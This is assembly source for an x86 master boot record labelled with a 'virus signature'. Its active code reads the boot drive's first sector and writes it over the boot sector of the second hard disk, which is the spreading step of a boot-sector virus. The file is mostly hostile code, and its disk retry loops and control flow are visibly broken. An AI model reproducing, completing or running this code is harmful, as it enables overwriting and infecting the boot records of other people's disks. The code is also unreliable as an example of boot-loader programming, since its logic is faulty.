[bits 16]
org 0x7c00

start:
  cli                         ; We do not want to be interrupted
  mov BYTE [bootDrive], dl    ; save boot drive, so we know where to copy from
  xor ax, ax                  ; 0 AX
  mov ds, ax                  ; Set Data Segment to 0
  mov es, ax                  ; Set Extra Segment to 0
  mov ss, ax                  ; Set Stack Segment to 0
  mov sp, 0xFFF8              ; Set Stack Pointer to 0xFFF8

  mov al, 0x01              ; load 1 sector
  mov bx, 0x7e00            ; destination address + ES
  mov cx, 0x0001            ; cylinder 0, sector=1
  xor dh, dh                ; head 0
  call read_sector

  mov dl, 0x81
  call write_sector
  ;.CopyLower:
    ;mov cx, 0x0100            ; 256 WORDs in MBR
    ;mov si, 0x7C00            ; Current MBR Address
    ;mov di, 0x0600            ; New MBR Address
    ;rep movsw                 ; Copy MBR
  ;jmp 0:LowStart              ; Jump to new Address

  ;.jumpToVBR:
    ;cmp WORD [0x7DFE], 0xAA55 ; Check Boot Signature
    ;jne ERROR                 ; Error if not Boot Signature
    ;mov si, WORD [PToff]      ; Set DS:SI to Partition Table Entry
    ;mov dl, BYTE [bootDrive]  ; Set DL to Drive Number
    ;jmp 0x7C00                ; Jump To VBR

read_sector:
  pusha
  mov si, 0x03                ; max number of attempts to read from drive
.lprs:
  mov ah, 0x02                ; read stuff code
  int 0x13
  jnc .endrs                  ; alright carry was not set, read was successful
  dec si                      ; decrement counter
  jc .endrs
  xor ah, ah                  ; ah = 0, reset disk
  int 0x13                    ; reset disk, we have to try this at most 3 times
  jmp .lprs
.endrs:
  popa
  retn

write_sector:
  pusha
  mov si, 0x03                ; max number of attempts to read from drive
.lprs:
  mov ah, 0x03                ; read stuff code
  int 0x13
  jnc .endrs                  ; alright carry was not set, read was successful
  dec si                      ; decrement counter
  jc .endrs
  xor ah, ah                  ; ah = 0, reset disk
  int 0x13                    ; reset disk, we have to try this at most 3 times
  jmp .lprs
.endrs:
  popa
  retn

times (218 - ($-$$)) nop      ; Pad for disk time stamp

DiskTimeStamp times 8 db 0    ; Disk Time Stamp

bootDrive db 0                ; Our Drive Number Variable
PToff dw 0                    ; Our Partition Table Entry Offset

times (0x1b4 - ($-$$)) nop    ; Pad For MBR Partition Table

UID times 10 db 0             ; Unique Disk ID
PT1 times 16 db 0             ; First Partition Entry
PT2 times 16 db 0             ; Second Partition Entry
PT3 times 16 db 0             ; Third Partition Entry
PT4 times 16 db 0             ; Fourth Partition Entry

dw 0xBABE                     ; virus signature
dw 0xAA55                     ; Boot Signature
